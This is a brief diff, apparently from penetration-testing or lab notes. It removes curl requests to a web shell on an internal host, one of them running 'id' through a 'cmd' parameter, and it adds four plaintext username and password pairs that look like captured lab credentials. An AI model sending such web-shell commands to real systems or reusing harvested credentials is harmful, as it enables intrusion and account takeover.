@@ -1,3 +1,4 @@
-curl "http://172.17.17.118:8080/shell/?cmd=id"
-
-curl http://172.17.17.118:8080/examples/
+wolverine : Log@N
+thor : Asgard
+johnny : m3ph1st0ph3l3s
+neo : trinity
